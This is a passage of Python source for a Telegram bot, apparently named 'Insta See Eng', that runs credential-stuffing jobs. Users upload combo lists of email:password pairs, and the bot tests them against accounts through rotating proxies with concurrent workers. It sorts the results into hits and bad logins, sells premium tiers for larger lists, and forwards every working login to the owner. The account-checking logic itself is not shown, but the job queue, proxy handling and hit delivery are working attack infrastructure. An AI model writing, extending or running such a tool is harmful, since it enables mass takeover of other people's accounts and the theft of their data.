            f"Job {job.job_id[:8]} done: "
            f"{job.hits}H/{job.bad}B/{job.errors}E "
            f"in {AnimationEngine.format_time(job.elapsed)}"
        )

    async def _check_one(
        self, job: CheckJob, username: str, password: str, sem: asyncio.Semaphore
    ) -> None:
        """Check a single account with semaphore limiting."""
        if job.cancel_event.is_set():
            return

        async with sem:
            if job.cancel_event.is_set():
                return
            try:
                result = await self.checker.check_account(username, password)
            except Exception as e:
                result = AccountResult(
                    raw=f"{username}:{password}",
                    username=username, password=password,
                    status=AccountStatus.ERROR, detail=str(e),
                )

        job.results.append(result)
        job.checked += 1

        if result.is_hit:
            job.hits += 1
            if self.on_hit:
                try:
                    await self.on_hit(job, result)
                except Exception:
                    pass
        elif result.is_bad:
            job.bad += 1
        else:
            job.errors += 1

    async def _progress_loop(self, job: CheckJob) -> None:
        """Periodically trigger progress updates."""
        tick = 0
        while not job.cancel_event.is_set() and job.status in (JobStatus.RUNNING, JobStatus.QUEUED, JobStatus.PAUSED):
            await asyncio.sleep(PROGRESS_UPDATE_INTERVAL)
            tick += 1
            if self.on_progress:
                try:
                    await self.on_progress(job, tick)
                except Exception:
                    pass


# =============================================================================
#   TELEGRAM BOT
# =============================================================================

class InstaSeeEngBot:
    """
    The main Telegram bot class.
    Handles all updates, commands, file uploads, and admin operations.
    """

    def __init__(self) -> None:
        self.storage   = StorageManager()
        self.proxy_mgr = ProxyManager()
        self.checker   = CODMChecker(self.proxy_mgr)
        self.queue_mgr = JobQueueManager(self.checker, self.storage, MAX_WORKERS)
        self.anim      = AnimationEngine()
        self.app:      Optional[Application] = None

        # Wire up callbacks
        self.queue_mgr.on_progress = self._on_job_progress
        self.queue_mgr.on_complete = self._on_job_complete
        self.queue_mgr.on_hit      = self._on_hit_found

        # Temp dir for downloads
        self._tmp_dir = Path(tempfile.mkdtemp(prefix="insta_see_eng_"))

    # ── Initialization ────────────────────────────────────────────────────────

    async def initialize(self) -> None:
        """Load all data and proxies before starting."""
        await self.storage.load_all()
        await self.proxy_mgr.load_from_file(PROXIES_FILE)
        logger.info("Bot initialized")

    async def start(self) -> None:
        """Build and run the Telegram bot."""
        await self.initialize()

        if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
            logger.critical("BOT_TOKEN is not set! Edit BOT_TOKEN in the script.")
            sys.exit(1)

        self.app = (
            ApplicationBuilder()
            .token(BOT_TOKEN)
            .concurrent_updates(True)
            .build()
        )

        # Register handlers
        self._register_handlers()

        # Set bot commands
        await self._set_commands()

        # Start queue workers
        await self.queue_mgr.start()

        # Start save loop
        self.app.job_queue.run_repeating(
            self._periodic_save, interval=60, first=30, name="periodic_save"
        )

        logger.info(f"Starting {__bot_name__} bot...")
        print_banner()

        # Run until stopped
        async with self.app:
            await self.app.initialize()
            await self.app.start()
            await self.app.updater.start_polling(drop_pending_updates=True)
            logger.info("Bot is running. Press Ctrl+C to stop.")
            try:
                await asyncio.Event().wait()  # Run forever
            except (KeyboardInterrupt, SystemExit):
                pass
            finally:
                await self.app.updater.stop()
                await self.app.stop()
                await self.app.shutdown()
                await self.queue_mgr.stop()
                await self.storage.save_all()
                logger.info("Bot stopped cleanly.")

    def _register_handlers(self) -> None:
        """Register all command and message handlers."""
        app = self.app

        # Commands
        app.add_handler(CommandHandler("start",       self.cmd_start))
        app.add_handler(CommandHandler("help",        self.cmd_help))
        app.add_handler(CommandHandler("status",      self.cmd_status))
        app.add_handler(CommandHandler("cancel",      self.cmd_cancel))
        app.add_handler(CommandHandler("stats",       self.cmd_stats))
        app.add_handler(CommandHandler("proxies",     self.cmd_proxies))
        app.add_handler(CommandHandler("pause",       self.cmd_pause))
        app.add_handler(CommandHandler("resume",      self.cmd_resume))

        # Admin commands
        app.add_handler(CommandHandler("admin",       self.cmd_admin))
        app.add_handler(CommandHandler("addpremium",  self.cmd_add_premium))
        app.add_handler(CommandHandler("rmpremium",   self.cmd_remove_premium))
        app.add_handler(CommandHandler("ban",         self.cmd_ban))
        app.add_handler(CommandHandler("unban",       self.cmd_unban))
        app.add_handler(CommandHandler("broadcast",   self.cmd_broadcast))
        app.add_handler(CommandHandler("setworkers",  self.cmd_set_workers))
        app.add_handler(CommandHandler("addproxy",    self.cmd_add_proxy))
        app.add_handler(CommandHandler("clearqueue",  self.cmd_clear_queue))
        app.add_handler(CommandHandler("userinfo",    self.cmd_user_info))
        app.add_handler(CommandHandler("reload",      self.cmd_reload))

        # File handler (combo upload)
        app.add_handler(MessageHandler(
            filters.Document.FileExtension("txt") |
            filters.Document.FileExtension("TXT") |
            filters.Document.MimeType("text/plain"),
            self.handle_file_upload,
        ))

        # Callback query (buttons)
        app.add_handler(CallbackQueryHandler(self.handle_callback))

        # Unknown command
        app.add_handler(MessageHandler(filters.COMMAND, self.cmd_unknown))

        # Error handler
        app.add_error_handler(self.error_handler)

    async def _set_commands(self) -> None:
        """Set the bot's command list in Telegram."""
        commands = [
            BotCommand("start",   "Welcome message"),
            BotCommand("help",    "Full help guide"),
            BotCommand("status",  "Your queue status"),
            BotCommand("cancel",  "Cancel your job"),
            BotCommand("pause",   "Pause your job"),
            BotCommand("resume",  "Resume your job"),
            BotCommand("stats",   "Global bot stats"),
            BotCommand("proxies", "Proxy pool status"),
        ]
        try:
            await self.app.bot.set_my_commands(commands)
        except Exception as e:
            logger.warning(f"Could not set commands: {e}")

    # ── Helpers ───────────────────────────────────────────────────────────────

    async def _guard(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> Optional[UserProfile]:
        """
        Common guard: check if user exists, is not banned, return profile.
        Returns None if access denied (already replied with error).
        """
        user = update.effective_user
        if not user:
            return None

        profile = await self.storage.get_or_create_user(user)

        if profile.is_banned:
            await self._reply(update, (
                f"🚫 **You are banned.**\n"
                f"Reason: {profile.banned_reason or 'Contact @JAYYYTTTTTTTtt'}"
            ))
            return None

        return profile

    async def _is_admin(self, user_id: int) -> bool:
        profile = await self.storage.get_user(user_id)
        if not profile:
            return False
        return profile.is_admin or (OWNER_ID and user_id == OWNER_ID)

    async def _require_admin(
        self, update: Update, context: ContextTypes.DEFAULT_TYPE
    ) -> bool:
        user = update.effective_user
        if not user:
            return False
        if await self._is_admin(user.id):
            return True
        await self._reply(update, "🚫 Admin only.")
        return False

    async def _reply(
        self, update: Update, text: str,
        parse_mode: str = ParseMode.MARKDOWN,
        reply_markup: Any = None,
    ) -> Optional[Message]:
        try:
            return await update.effective_message.reply_text(
                text,
                parse_mode=parse_mode,
                reply_markup=reply_markup,
                disable_web_page_preview=True,
            )
        except TelegramError as e:
            logger.warning(f"Reply error: {e}")
            # Try without parse mode
            try:
                return await update.effective_message.reply_text(
                    text.replace("**", "").replace("`", ""),
                    disable_web_page_preview=True,
                )
            except Exception:
                return None

    async def _edit_message(
        self, chat_id: int, msg_id: int, text: str,
        parse_mode: str = ParseMode.MARKDOWN,
        reply_markup: Any = None,
    ) -> bool:
        """Edit a message, swallowing common errors."""
        try:
            await self.app.bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg_id,
                text=text[:MAX_MESSAGE_LENGTH],
                parse_mode=parse_mode,
                disable_web_page_preview=True,
                reply_markup=reply_markup,
            )
            return True
        except BadRequest as e:
            if "message is not modified" in str(e).lower():
                return True  # OK
            if "message to edit not found" in str(e).lower():
                return False
            logger.debug(f"Edit message BadRequest: {e}")
            return False
        except RetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
            return await self._edit_message(chat_id, msg_id, text, parse_mode, reply_markup)
        except TelegramError as e:
            logger.debug(f"Edit message error: {e}")
            return False

    async def _send_file(
        self, chat_id: int, path: str, caption: str = ""
    ) -> bool:
        """Send a file to a chat."""
        try:
            async with aiofiles.open(path, "rb") as f:
                data = await f.read()
            buf = BytesIO(data)
            buf.name = Path(path).name
            await self.app.bot.send_document(
                chat_id=chat_id,
                document=buf,
                caption=caption[:1024] if caption else None,
                parse_mode=ParseMode.MARKDOWN,
            )
            return True
        except Exception as e:
            logger.error(f"Error sending file {path}: {e}")
            return False

    def _cancel_keyboard(self, job_id: str) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([[
            InlineKeyboardButton("⏸️ Pause",  callback_data=f"pause:{job_id}"),
            InlineKeyboardButton("🚫 Cancel", callback_data=f"cancel:{job_id}"),
        ]])

    def _resume_keyboard(self, job_id: str) -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([[
            InlineKeyboardButton("▶️ Resume", callback_data=f"resume:{job_id}"),
            InlineKeyboardButton("🚫 Cancel", callback_data=f"cancel:{job_id}"),
        ]])

    # ── Command Handlers ──────────────────────────────────────────────────────

    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /start command."""
        profile = await self._guard(update, context)
        if not profile:
            return
        await self._reply(update, AnimationEngine.build_welcome_message())

    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /help command."""
        profile = await self._guard(update, context)
        if not profile:
            return
        await self._reply(update, AnimationEngine.build_help_message())

    async def cmd_status(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /status command — show user's current job status."""
        profile = await self._guard(update, context)
        if not profile:
            return

        job = await self.queue_mgr.get_user_job(update.effective_user.id)
        if not job:
            await self._reply(update, (
                f"📋 **Status**\n"
                f"{'─' * 30}\n"
                f"\n"
                f"You have no active job.\n"
                f"\n"
                f"Drop a `.txt` combo file to start checking!\n"
                f"\n"
                f"{'─' * 30}\n"
                f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
            ))
            return

        msg = AnimationEngine.build_progress_message(job, tick=0)
        markup = (
            self._cancel_keyboard(job.job_id)
            if job.status == JobStatus.RUNNING
            else self._resume_keyboard(job.job_id) if job.status == JobStatus.PAUSED
            else None
        )
        await self._reply(update, msg, reply_markup=markup)

    async def cmd_cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /cancel command."""
        profile = await self._guard(update, context)
        if not profile:
            return

        job_id = await self.queue_mgr.cancel_user_job(update.effective_user.id)
        if job_id:
            await self._reply(update, f"🚫 Job `{job_id[:8]}` has been cancelled.")
        else:
            await self._reply(update, "You have no active job to cancel.")

    async def cmd_pause(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /pause command."""
        profile = await self._guard(update, context)
        if not profile:
            return

        success = await self.queue_mgr.pause_user_job(update.effective_user.id)
        if success:
            await self._reply(update, "⏸️ Job paused. Use /resume to continue.")
        else:
            await self._reply(update, "No running job to pause.")

    async def cmd_resume(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /resume command."""
        profile = await self._guard(update, context)
        if not profile:
            return

        success = await self.queue_mgr.resume_user_job(update.effective_user.id)
        if success:
            await self._reply(update, "▶️ Job resumed!")
        else:
            await self._reply(update, "No paused job to resume.")

    async def cmd_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /stats command."""
        profile = await self._guard(update, context)
        if not profile:
            return

        stats = self.storage.stats
        msg = AnimationEngine.build_stats_message(
            stats,
            active_jobs=self.queue_mgr.active_count(),
            queued=self.queue_mgr.queue_size(),
        )
        await self._reply(update, msg)

    async def cmd_proxies(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle /proxies command."""
        profile = await self._guard(update, context)
        if not profile:
            return

        status = self.proxy_mgr.status_line()
        msg = (
            f"🌐 **Proxy Pool Status**\n"
            f"{'─' * 30}\n"
            f"\n"
            f"`{status}`\n"
            f"\n"
            f"{'─' * 30}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )
        await self._reply(update, msg)

    async def cmd_unknown(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Handle unknown commands."""
        await self._reply(update, (
            "❓ Unknown command. Use /help to see available commands.\n\n"
            "👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        ))

    # ── Admin Commands ────────────────────────────────────────────────────────

    async def cmd_admin(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Show admin panel."""
        if not await self._require_admin(update, context):
            return

        stats = self.storage.stats
        users = await self.storage.get_all_users()
        premium_users = [u for u in users if u.is_premium and not u.is_admin]
        banned_users  = [u for u in users if u.is_banned]

        panel = (
            f"🔧 **Admin Panel — Insta See Eng**\n"
            f"{'─' * 34}\n"
            f"\n"
            f"👤 Total Users    : `{len(users)}`\n"
            f"💎 Premium Users  : `{len(premium_users)}`\n"
            f"🚫 Banned Users   : `{len(banned_users)}`\n"
            f"\n"
            f"🔄 Active Jobs    : `{self.queue_mgr.active_count()}`\n"
            f"📋 Queued Jobs    : `{self.queue_mgr.queue_size()}`\n"
            f"⚙️ Workers        : `{self.queue_mgr.num_workers}`\n"
            f"🌐 Proxies        : `{self.proxy_mgr.status_line()}`\n"
            f"\n"
            f"📊 Total Checked  : `{stats.total_checked:,}`\n"
            f"✅ Total Hits     : `{stats.total_hits:,}` ({stats.hit_rate:.2f}%)\n"
            f"\n"
            f"**Admin Commands:**\n"
            f"`/addpremium <user_id> [days]` — Grant premium\n"
            f"`/rmpremium <user_id>` — Remove premium\n"
            f"`/ban <user_id> <reason>` — Ban user\n"
            f"`/unban <user_id>` — Unban user\n"
            f"`/userinfo <user_id>` — User details\n"
            f"`/broadcast <message>` — Message everyone\n"
            f"`/setworkers <n>` — Change workers\n"
            f"`/addproxy <proxy>` — Add proxy\n"
            f"`/clearqueue` — Clear job queue\n"
            f"`/reload` — Reload data\n"
            f"\n"
            f"{'─' * 34}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )
        await self._reply(update, panel)

    async def cmd_add_premium(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Grant premium status to a user."""
        if not await self._require_admin(update, context):
            return

        args = context.args
        if not args:
            await self._reply(update, "Usage: `/addpremium <user_id> [days=30]`")
            return

        try:
            target_id = int(args[0])
            days = int(args[1]) if len(args) > 1 else 30
        except ValueError:
            await self._reply(update, "❌ Invalid user ID or days.")
            return

        await self.storage.set_premium(target_id, days)
        await self.storage.save_users()
        await self._reply(update, f"✅ User `{target_id}` granted premium for `{days}` days.")
        logger.info(f"Admin granted premium to {target_id} for {days} days")

    async def cmd_remove_premium(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Remove premium from a user."""
        if not await self._require_admin(update, context):
            return

        args = context.args
        if not args:
            await self._reply(update, "Usage: `/rmpremium <user_id>`")
            return

        try:
            target_id = int(args[0])
        except ValueError:
            await self._reply(update, "❌ Invalid user ID.")
            return

        user = await self.storage.get_user(target_id)
        if not user:
            await self._reply(update, f"User `{target_id}` not found.")
            return

        user.tier = UserTier.FREE
        user.premium_until = 0.0
        await self.storage.update_user(user)
        await self.storage.save_users()
        await self._reply(update, f"✅ Removed premium from user `{target_id}`.")

    async def cmd_ban(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Ban a user."""
        if not await self._require_admin(update, context):
            return

        args = context.args
        if not args:
            await self._reply(update, "Usage: `/ban <user_id> <reason>`")
            return

        try:
            target_id = int(args[0])
        except ValueError:
            await self._reply(update, "❌ Invalid user ID.")
            return

        reason = " ".join(args[1:]) if len(args) > 1 else "No reason"
        await self.storage.ban_user(target_id, reason)
        await self._reply(update, f"🚫 User `{target_id}` banned.\nReason: {reason}")
        logger.info(f"Admin banned user {target_id}: {reason}")

    async def cmd_unban(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Unban a user."""
        if not await self._require_admin(update, context):
            return

        args = context.args
        if not args:
            await self._reply(update, "Usage: `/unban <user_id>`")
            return

        try:
            target_id = int(args[0])
        except ValueError:
            await self._reply(update, "❌ Invalid user ID.")
            return

        await self.storage.unban_user(target_id)
        await self._reply(update, f"✅ User `{target_id}` unbanned.")

    async def cmd_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Send a message to all users."""
        if not await self._require_admin(update, context):
            return

        if not context.args:
            await self._reply(update, "Usage: `/broadcast <message>`")
            return

        message = " ".join(context.args)
        users = await self.storage.get_all_users()
        success = 0
        failed  = 0

        broadcast_msg = (
            f"📢 **Announcement from @JAYYYTTTTTTTtt**\n"
            f"{'─' * 30}\n"
            f"\n"
            f"{message}\n"
            f"\n"
            f"{'─' * 30}\n"
            f"👑 **Insta See Eng**"
        )

        status_msg = await self._reply(update, f"📢 Broadcasting to {len(users)} users...")
        for user in users:
            if user.is_banned:
                continue
            try:
                await self.app.bot.send_message(
                    chat_id=user.user_id,
                    text=broadcast_msg,
                    parse_mode=ParseMode.MARKDOWN,
                    disable_web_page_preview=True,
                )
                success += 1
            except Exception:
                failed += 1
            await asyncio.sleep(0.05)  # Rate limit

        await self._reply(update, f"✅ Broadcast complete: {success} sent, {failed} failed.")

    async def cmd_set_workers(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Change the number of concurrent workers."""
        if not await self._require_admin(update, context):
            return

        if not context.args:
            await self._reply(update, f"Usage: `/setworkers <n>` (current: {self.queue_mgr.num_workers})")
            return

        try:
            n = int(context.args[0])
            if not (1 <= n <= 50):
                raise ValueError("Out of range")
        except ValueError:
            await self._reply(update, "❌ Workers must be 1-50.")
            return

        self.queue_mgr.num_workers = n
        await self._reply(update, f"✅ Workers set to `{n}`. Takes effect on next job.")

    async def cmd_add_proxy(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Add a proxy to the pool."""
        if not await self._require_admin(update, context):
            return

        if not context.args:
            await self._reply(update, (
                "Usage: `/addproxy <proxy>`\n"
                "Formats:\n"
                "• `http://host:port`\n"
                "• `socks5://user:pass@host:port`\n"
                "• `host:port`"
            ))
            return

        line = context.args[0]
        if self.proxy_mgr.add_proxy(line):
            await self._reply(update, f"✅ Proxy `{line}` added. Pool: {self.proxy_mgr.count}")
        else:
            await self._reply(update, f"❌ Invalid proxy format: `{line}`")

    async def cmd_clear_queue(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Clear the job queue (admin only)."""
        if not await self._require_admin(update, context):
            return

        # Drain queue
        drained = 0
        while not self.queue_mgr._queue.empty():
            try:
                self.queue_mgr._queue.get_nowait()
                drained += 1
            except asyncio.QueueEmpty:
                break

        await self._reply(update, f"✅ Cleared `{drained}` jobs from queue.")

    async def cmd_user_info(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Show info about a specific user."""
        if not await self._require_admin(update, context):
            return

        if not context.args:
            await self._reply(update, "Usage: `/userinfo <user_id>`")
            return

        try:
            target_id = int(context.args[0])
        except ValueError:
            await self._reply(update, "❌ Invalid user ID.")
            return

        user = await self.storage.get_user(target_id)
        if not user:
            await self._reply(update, f"User `{target_id}` not found.")
            return

        premium_str = "Active" if user.is_premium else "None"
        if user.premium_until > time.time():
            exp = datetime.datetime.fromtimestamp(user.premium_until).strftime("%Y-%m-%d")
            premium_str = f"Until {exp}"

        msg = (
            f"👤 **User Info**\n"
            f"{'─' * 30}\n"
            f"\n"
            f"🆔 ID        : `{user.user_id}`\n"
            f"👤 Username  : `@{user.username or 'N/A'}`\n"
            f"📛 Name      : `{user.first_name}`\n"
            f"🎖️ Tier      : `{user.tier.value}`\n"
            f"💎 Premium   : `{premium_str}`\n"
            f"\n"
            f"📦 Jobs      : `{user.total_jobs}`\n"
            f"🔍 Checked   : `{user.total_checked:,}`\n"
            f"✅ Hits      : `{user.total_hits:,}`\n"
            f"\n"
            f"📅 Joined    : `{datetime.datetime.fromtimestamp(user.joined_at).strftime('%Y-%m-%d')}`\n"
            f"🕐 Last Seen : `{datetime.datetime.fromtimestamp(user.last_seen).strftime('%Y-%m-%d %H:%M')}`\n"
            f"\n"
            f"{'Banned: ' + user.banned_reason if user.is_banned else ''}"
            f"{'─' * 30}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        )
        await self._reply(update, msg)

    async def cmd_reload(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Reload data from disk."""
        if not await self._require_admin(update, context):
            return

        await self.storage.load_all()
        await self.proxy_mgr.load_from_file(PROXIES_FILE)
        await self._reply(update, "✅ Data reloaded from disk.")

    # ── File Upload Handler ───────────────────────────────────────────────────

    async def handle_file_upload(
        self, update: Update, context: ContextTypes.DEFAULT_TYPE
    ) -> None:
        """
        Handle .txt combo file uploads.
        Downloads the file, parses accounts, creates and queues a job.
        """
        profile = await self._guard(update, context)
        if not profile:
            return

        user    = update.effective_user
        message = update.effective_message
        doc     = message.document

        # ── Pre-flight checks ────────────────────────────────────────────────

        # Cooldown check
        cooldown = profile.cooldown_remaining
        if cooldown > 0:
            await self._reply(update, (
                f"⏳ **Cooldown Active**\n"
                f"\n"
                f"Please wait `{int(cooldown)}s` before uploading again.\n"
                f"\n"
                f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
            ))
            return

        # File size check (max 20MB)
        if doc.file_size and doc.file_size > 20 * 1024 * 1024:
            await self._reply(update, (
                f"❌ File too large.\n"
                f"Max size: `20 MB`\n"
                f"Your file: `{doc.file_size / 1024 / 1024:.1f} MB`"
            ))
            return

        # Existing job check
        existing = await self.queue_mgr.get_user_job(user.id)
        if existing and existing.status in (JobStatus.RUNNING, JobStatus.QUEUED, JobStatus.PAUSED):
            await self._reply(update, (
                f"⚠️ You already have an active job.\n"
                f"Use /cancel to stop it first."
            ))
            return

        # ── Download file ────────────────────────────────────────────────────

        loading_msg = await self._reply(update, (
            f"⬇️ Downloading combo file...\n"
            f"{'─' * 30}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        ))

        tmp_path = self._tmp_dir / f"{user.id}_{int(time.time())}.txt"
        try:
            tg_file = await context.bot.get_file(doc.file_id)
            await tg_file.download_to_drive(str(tmp_path))
        except TelegramError as e:
            await self._reply(update, AnimationEngine.build_error_message(f"Download failed: {e}"))
            return

        # ── Parse accounts ───────────────────────────────────────────────────

        max_accs = profile.max_accounts
        try:
            accounts, invalid, raw_count = await ComboParser.parse_file(str(tmp_path), max_accs)
        except ValueError as e:
            await self._reply(update, AnimationEngine.build_error_message(str(e)))
            return
        finally:
            with suppress(FileNotFoundError):
                tmp_path.unlink()

        if not accounts:
            await self._reply(update, (
                f"❌ **No valid accounts found.**\n"
                f"\n"
                f"File has `{raw_count}` lines but none matched format:\n"
                f"`email:password` or `username:password`\n"
                f"\n"
                f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
            ))
            return

        # Inform if we truncated
        truncated_note = ""
        if raw_count > max_accs:
            truncated_note = (
                f"\n⚠️ Truncated to `{max_accs:,}` (file had `{raw_count:,}` lines)\n"
                f"   Upgrade to premium for higher limits."
            )

        # ── Create job ───────────────────────────────────────────────────────

        job_id = uuid.uuid4().hex

        # Send progress message (will be edited during checking)
        job_msg = await self._reply(update, (
            f"📋 **Starting Check...**\n"
            f"{'─' * 30}\n"
            f"\n"
            f"📦 Accounts   : `{len(accounts):,}`{truncated_note}\n"
            f"🗑️ Invalid    : `{len(invalid):,}`\n"
            f"\n"
            f"⏳ Queuing job `{job_id[:8]}`...\n"
            f"\n"
            f"{'─' * 30}\n"
            f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**"
        ))

        if not job_msg:
            return

        job = CheckJob(
            job_id=job_id,
            user_id=user.id,
            chat_id=message.chat_id,
            msg_id=job_msg.message_id,
            accounts=accounts,
        )

        # Update user's last upload timestamp
        profile.last_upload = time.time()
        await self.storage.update_user(profile)

        # Queue the job
        success = await self.queue_mgr.submit_job(job)
        if not success:
            await self._reply(update, "❌ Queue is full. Please try again later.")
            return

        q_size = self.queue_mgr.queue_size()
        eta    = q_size * (len(accounts) / max(1, MAX_WORKERS)) * 0.5

        # Update message to show queue position
        await self._edit_message(
            job.chat_id, job.msg_id,
            AnimationEngine.build_queue_position_message(q_size, q_size, eta),
            reply_markup=self._cancel_keyboard(job_id),
        )

        logger.info(f"Job {job_id[:8]} created: {len(accounts)} accounts, user {user.id} (@{user.username})")

    # ── Callback Query Handler ────────────────────────────────────────────────

    async def handle_callback(
        self, update: Update, context: ContextTypes.DEFAULT_TYPE
    ) -> None:
        """Handle inline keyboard button presses."""
        query = update.callback_query
        if not query:
            return

        await query.answer()
        user_id = query.from_user.id
        data    = query.data or ""

        if data.startswith("cancel:"):
            job_id = data.split(":", 1)[1]
            job    = await self.queue_mgr.get_user_job(user_id)
            if job and job.job_id == job_id:
                await self.queue_mgr.cancel_user_job(user_id)
                await query.edit_message_text(
                    f"🚫 Job `{job_id[:8]}` cancelled.\n\n"
                    f"👑 **@JAYYYTTTTTTTtt** | **Insta See Eng**",
                    parse_mode=ParseMode.MARKDOWN,
                )
            else:
                await query.answer("Job not found or not yours.", show_alert=True)

        elif data.startswith("pause:"):
            job_id = data.split(":", 1)[1]
            success = await self.queue_mgr.pause_user_job(user_id)
            if success:
                job = await self.queue_mgr.get_user_job(user_id)
                if job:
                    await query.edit_message_text(
                        AnimationEngine.build_progress_message(job),
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=self._resume_keyboard(job_id),
                    )
            else:
                await query.answer("Nothing to pause.", show_alert=True)

        elif data.startswith("resume:"):
            job_id = data.split(":", 1)[1]
            success = await self.queue_mgr.resume_user_job(user_id)
            if success:
                job = await self.queue_mgr.get_user_job(user_id)
                if job:
                    await query.edit_message_text(
                        AnimationEngine.build_progress_message(job),
                        parse_mode=ParseMode.MARKDOWN,
                        reply_markup=self._cancel_keyboard(job_id),
                    )
            else:
                await query.answer("Nothing to resume.", show_alert=True)

    # ── Queue Callbacks ───────────────────────────────────────────────────────

    async def _on_job_progress(self, job: CheckJob, tick: int) -> None:
        """Called periodically with job progress — update the message."""
        msg = AnimationEngine.build_progress_message(job, tick)
        markup = None
        if job.status == JobStatus.RUNNING:
            markup = self._cancel_keyboard(job.job_id)
        elif job.status == JobStatus.PAUSED:
            markup = self._resume_keyboard(job.job_id)

        await self._edit_message(job.chat_id, job.msg_id, msg, reply_markup=markup)

    async def _on_job_complete(self, job: CheckJob) -> None:
        """Called when a job finishes — send results."""
        # Update progress message to final state
        final_msg = AnimationEngine.build_result_message(job)
        await self._edit_message(job.chat_id, job.msg_id, final_msg)

        # Write result files
        try:
            file_paths = await ResultFileBuilder.write_results(job)
        except Exception as e:
            logger.error(f"Error writing results: {e}")
            await self.app.bot.send_message(
                chat_id=job.chat_id,
                text=f"⚠️ Results written but file send failed: {e}",
            )
            return

        # Send each non-empty file
        sent_any = False
        for category, path in file_paths.items():
            if path and Path(path).exists():
                icons = {"hits": "✅", "bad": "❌", "errors": "⚠️"}
                icon  = icons.get(category, "📄")
                count = {
                    "hits":   job.hits,
                    "bad":    job.bad,
                    "errors": job.errors,
                }.get(category, 0)

                caption = (
                    f"{icon} **{category.upper()}** — `{count:,}` accounts\n"
                    f"Job `{job.job_id[:8]}` | @JAYYYTTTTTTTtt"
                )
                await self._send_file(job.chat_id, path, caption)
                sent_any = True

        if not sent_any:
            await self.app.bot.send_message(
                chat_id=job.chat_id,
                text=(
                    f"📭 No results to send — all accounts processed with `{job.checked}` checked.\n"
                    f"Hits: `{job.hits}`, Bad: `{job.bad}`, Errors: `{job.errors}`"
                ),
                parse_mode=ParseMode.MARKDOWN,
            )

        # Send notification to owner if there are hits
        if job.hits > 0 and OWNER_ID:
            try:
                notif = (
                    f"🔥 **Job Complete — Hits Found!**\n"
                    f"User ID: `{job.user_id}`\n"
                    f"Hits: `{job.hits}` / `{job.total}`\n"
                    f"Job: `{job.job_id[:8]}`"
                )
                await self.app.bot.send_message(
                    chat_id=OWNER_ID,
                    text=notif,
                    parse_mode=ParseMode.MARKDOWN,
                )
            except Exception:
                pass

    async def _on_hit_found(self, job: CheckJob, result: AccountResult) -> None:
        """Called immediately when a hit is found."""
        # Notify owner
        if OWNER_ID:
            try:
                msg = AnimationEngine.build_hit_notification(result)
                await self.app.bot.send_message(
                    chat_id=OWNER_ID,
                    text=msg,
                    parse_mode=ParseMode.MARKDOWN,
                )
            except Exception:
                pass

    # ── Error Handler ─────────────────────────────────────────────────────────

    async def error_handler(
        self, update: object, context: ContextTypes.DEFAULT_TYPE
    ) -> None:
        """Handle uncaught errors from handlers."""
        err = context.error
        if isinstance(err, (NetworkError, TimedOut)):
            logger.warning(f"Network error: {err}")
            return
        if isinstance(err, RetryAfter):
            logger.warning(f"Rate limited — retry after {err.retry_after}s")
            return
        if isinstance(err, Forbidden):
            # User blocked the bot
            if update and hasattr(update, "effective_user") and update.effective_user:
                logger.info(f"Bot blocked by user {update.effective_user.id}")
            return

        logger.error(f"Unhandled error: {err}", exc_info=err)

        if isinstance(update, Update) and update.effective_message:
            try:
                await update.effective_message.reply_text(
                    "⚠️ An unexpected error occurred. Please try again.\n"
                    "Contact @JAYYYTTTTTTTtt if the issue persists.",
                )
            except Exception:
                pass

    # ── Periodic Save ─────────────────────────────────────────────────────────

    async def _periodic_save(self, context: ContextTypes.DEFAULT_TYPE) -> None:
        """Periodically save data to disk."""
        try:
            await self.storage.save_all()
            logger.debug("Periodic save complete")
        except Exception as e:
            logger.error(f"Periodic save error: {e}")


# =============================================================================
#   UTILITY FUNCTIONS
# =============================================================================

def print_banner() -> None:
    """Print startup banner to console."""
    banner = f"""
{Fore.CYAN if HAS_COLORAMA else ''}
╔══════════════════════════════════════════════════════╗
║                                                      ║
║    ██╗███╗   ██╗███████╗████████╗ █████╗             ║
║    ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗            ║
║    ██║██╔██╗ ██║███████╗   ██║   ███████║            ║
║    ██║██║╚██╗██║╚════██║   ██║   ██╔══██║            ║
║    ██║██║ ╚████║███████║   ██║   ██║  ██║            ║
